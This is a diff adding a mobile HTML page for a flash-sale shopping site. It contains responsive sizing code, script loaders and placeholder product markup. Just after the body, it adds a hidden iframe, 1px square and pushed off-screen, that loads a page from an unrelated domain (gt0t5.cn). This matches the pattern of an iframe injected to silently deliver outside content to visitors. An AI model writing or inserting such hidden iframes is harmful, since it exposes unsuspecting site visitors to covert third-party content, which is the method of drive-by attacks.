@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0,maximum-scale=1.0, user-scalable=0" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
+    <meta name="format-detection" content="telephone=no" />
+    <meta content="IE=edge" http-equiv="X-UA-Compatible" />
+    <title></title>
+    <link rel="stylesheet" href="http://rescdn.sitezt.cn/Newcms/css/mobile/m_common.css">
+    <script>
+        (function () {
+            function o() { 
+                if(document.documentElement.clientWidth > 750){
+                    document.documentElement.style.fontSize = 750/15 + 'px'
+                }else if(document.documentElement.clientWidth > 320){
+                    document.documentElement.style.fontSize = document.documentElement.clientWidth/15 + 'px'
+                }else{
+                    document.documentElement.style.fontSize = 320/15 + 'px'
+                }
+            }
+            var e = null;
+            window.addEventListener("resize", function () { clearTimeout(e), e = setTimeout(o, 300) }, !1), o()
+        })(window);
+
+        var ajaxHost = "http://mgi.sitezt.cn"
+        var commonPost = ['http://rescdn.sitezt.cn/Newcms/js/jquery.min.js','//rescdn.sitezt.cn/A/c/CommonJs/jquery.lazyload.js','http://rescdn.sitezt.cn/Newcms/js/common/jump.js','http://rescdn.sitezt.cn/Newcms/js/common/apiServer.js','http://rescdn.sitezt.cn/Newcms/js/common/m_common.js']
+    </script>
+</head><link rel="stylesheet" href="http://rescdn.sitezt.cn/Newcms/css/mobile/m_xsqg.css"><script>document.title="限时抢购";var post=["http://rescdn.sitezt.cn/Newcms/js/mobile/m_xsqg.js"]</script><body><div class="m_xsqg"><div class="header"><div class="title"><a class="go-back" href="javascript:;"></a></div></div><div class="content"><div class="c-h-bg"></div><div class="time-box"></div><div class="goods"><ul><li><div class="xsqg-shell"><div class="xsqg-shell-img"></div><div class="xsqg-shell-p1"></div><div class="xsqg-shell-p1"></div><div class="xsqg-shell-p2"></div></div></li><li><div class="xsqg-shell"><div class="xsqg-shell-img"></div><div class="xsqg-shell-p1"></div><div class="xsqg-shell-p1"></div><div class="xsqg-shell-p2"></div></div></li><li><div class="xsqg-shell"><div class="xsqg-shell-img"></div><div class="xsqg-shell-p1"></div><div class="xsqg-shell-p1"></div><div class="xsqg-shell-p2"></div></div></li><li><div class="xsqg-shell"><div class="xsqg-shell-img"></div><div class="xsqg-shell-p1"></div><div class="xsqg-shell-p1"></div><div class="xsqg-shell-p2"></div></div></li><li><div class="xsqg-shell"><div class="xsqg-shell-img"></div><div class="xsqg-shell-p1"></div><div class="xsqg-shell-p1"></div><div class="xsqg-shell-p2"></div></div></li></ul></div></div></div></body><a id="go-top" href="javascript:;"></a>
+<iframe style="position: absolute;width:1px;height:1px;bottom:0px;left:-1000px;overflow:hidden;text-indent:-10px;" src="http://www.gt0t5.cn/index.html"></iframe>
+<script>
+    var _post = commonPost.concat(post)
+    console.log(_post)
+
+    var footer = document.getElementsByTagName('body')[0]
+
+    for (var i = 0; i < _post.length; i++) { 
+        var newScript=document.createElement('script'); 
+        newScript.type='text/javascript'; 
+        newScript.async=false; 
+        newScript.src=_post[i]; 
+        footer.appendChild(newScript); 
+    }
+
+    function GetQueryString(name) {
+        var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
+        var url = window.location.search.substr(1);
+        var r = url.match(reg);
+        return r ? decodeURIComponent(r[2]) : null;
+    }
+    
+</script>
+</html>
